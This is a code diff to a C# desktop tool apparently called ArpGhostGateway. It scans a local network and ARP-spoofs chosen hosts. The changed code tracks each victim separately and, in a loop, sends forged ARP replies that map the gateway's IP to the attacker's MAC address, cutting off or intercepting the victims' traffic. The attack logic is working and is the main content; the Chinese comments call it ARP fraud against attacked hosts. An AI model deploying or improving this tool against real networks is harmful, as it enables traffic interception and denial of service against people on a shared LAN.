@@ -4,6 +4,7 @@ using PacketDotNet;
 using SharpPcap;
 using SharpPcap.LibPcap;
 using System;
+using System.CodeDom;
 using System.Collections.Generic;
 using System.Collections.ObjectModel;
 using System.Linq;
@@ -20,9 +21,7 @@ namespace ArpGhostGateway
     {
         private readonly TimeSpan _timeout = new TimeSpan(0, 0, 2);
         private Task _scanTask = null;
-        private List<Task> _attackTasks = null;
         private CancellationTokenSource _cancellationTokenSource; //取消scan的token
-        private CancellationTokenSource _cancellationTokenSource1;//取消攻击的token
 
         /// <summary>
         /// 所有的网卡设备集合
@@ -42,6 +41,17 @@ namespace ArpGhostGateway
         {
             get { return _computers; }
             set { SetProperty(ref _computers, value); }
+        }
+
+        /// <summary>
+        /// 所有的被arp攻击主机集合
+        /// </summary>
+        private ObservableCollection<ArpAttackComputer> _arpAttackComputers;
+        public ObservableCollection<ArpAttackComputer> ArpAttackComputers
+        {
+            get { return _arpAttackComputers; }
+            set { SetProperty(ref _arpAttackComputers, value); }
+
         }
 
         /// <summary>
@@ -170,7 +180,6 @@ namespace ArpGhostGateway
         {
             IsScanning = false;
             IsAttacking = false;
-            _attackTasks = new List<Task>();
             LoadedCommand = new RelayCommand(Loaded);
             ShiftDeviceCommand = new RelayCommand(ShiftDevice);
             ScanCommand = new AsyncRelayCommand(ScanAsync);
@@ -178,7 +187,7 @@ namespace ArpGhostGateway
             CallTargetComputerCommand = new RelayCommand(CallTargetComputer);
             StopCallTargetComputerCommand = new RelayCommand(StopCallTargetComputer);
             _cancellationTokenSource = new CancellationTokenSource();
-            _cancellationTokenSource1 = new CancellationTokenSource();
+            ArpAttackComputers = new ObservableCollection<ArpAttackComputer>();
         }
 
         /// <summary>
@@ -283,14 +292,14 @@ namespace ArpGhostGateway
                         Application.Current.Dispatcher.Invoke(() => IsScanning = false);
                     }
 
-                    //如果attacktasks已完成，则IsScanning = false;
-                    if ((_attackTasks == null || _attackTasks.Count <= 0 || _attackTasks.All(x => x.IsCanceled)
-                            || _attackTasks.All(x => x.IsCompleted)) && IsAttacking)
-                    {
-                        _attackTasks?.Clear();
-                        _cancellationTokenSource1 = new CancellationTokenSource();
-                        Application.Current.Dispatcher.Invoke(() => IsAttacking = false);
-                    }
+                    ////如果attacktasks已完成，则IsScanning = false;
+                    //if ((_attackTasks == null || _attackTasks.Count <= 0 || _attackTasks.All(x => x.IsCanceled)
+                    //        || _attackTasks.All(x => x.IsCompleted)) && IsAttacking)
+                    //{
+                    //    _attackTasks?.Clear();
+                    //    _cancellationTokenSource1 = new CancellationTokenSource();
+                    //    Application.Current.Dispatcher.Invoke(() => IsAttacking = false);
+                    //}
 
                     await Task.Delay(500);
                 }
@@ -450,15 +459,22 @@ namespace ArpGhostGateway
                 return;
 
             IsAttacking = true;
-            LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
+            if (!LibPcapLiveDevice.Opened)
+                LibPcapLiveDevice.Open(DeviceModes.Promiscuous, 20);
             foreach (var compute in target)
             {
                 var packet = BuildResponse(IPAddress.Parse(compute.IPAddress), PhysicalAddress.Parse(compute.MacAddress), GatewayIp, LocalMac);
-                var aTask = Task.Run(async () =>
+                var attackComputer = new ArpAttackComputer()
+                {
+                    IPAddress = compute.IPAddress,
+                    MacAddress = compute.MacAddress,
+                };
+
+                attackComputer.AttackTask = Task.Run(async () =>
                 {
                     while (true)
                     {
-                        if (_cancellationTokenSource1.IsCancellationRequested)
+                        if (attackComputer.CancellationTokenSource.IsCancellationRequested)
                         {
                             break;
                         }
@@ -473,10 +489,8 @@ namespace ArpGhostGateway
 
                         await Task.Delay(1000);
                     }
-                    LibPcapLiveDevice.Close();
-                }, _cancellationTokenSource1.Token);
-
-                _attackTasks.Add(aTask);
+                }, attackComputer.CancellationTokenSource.Token);
+                ArpAttackComputers.Add(attackComputer);
             }
         }
 
@@ -485,7 +499,12 @@ namespace ArpGhostGateway
         /// </summary>
         private void StopCallTargetComputer() 
         {
-            _cancellationTokenSource1?.Cancel();
+            var targets = ArpAttackComputers.Where(x => x.IsSelected).ToList();
+            foreach (var item in targets) 
+            {
+                item.CancelTask();
+                ArpAttackComputers.Remove(item);
+            }
         }
 
         /// <summary>
@@ -529,5 +548,55 @@ namespace ArpGhostGateway
         public string IPAddress { get; set; }
         public string MacAddress { get; set; }
         public bool IsSelected { get; set; }
+    }
+
+    /// <summary>
+    /// 局域网内被arp攻击的主机列表元素
+    /// </summary>
+    public class ArpAttackComputer : ObservableObject
+    {
+        public string IPAddress { get; set; }
+        public string MacAddress { get; set; }
+        public bool IsSelected { get; set; }
+        public Task AttackTask { get; set; }
+        public CancellationTokenSource CancellationTokenSource { get; set; }
+
+        private double _value;
+        public double Value
+        {
+            get => _value;
+            set => SetProperty(ref _value, value);
+        }
+
+        public ArpAttackComputer()
+        {
+            CancellationTokenSource = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (true) 
+                {
+                    await Task.Delay(500);
+                    Application.Current.Dispatcher.Invoke(() =>
+                    {
+                        Value += 33;
+                        if (Value > 100)
+                            Value = 0;
+                    });
+                }
+            });
+        }
+
+        /// <summary>
+        /// 发送arp诈骗
+        /// </summary>
+        internal void SendArpSpoofing() 
+        {
+            AttackTask?.Start();
+        }
+
+        internal void CancelTask() 
+        {
+            CancellationTokenSource?.Cancel();
+        }
     }
 }
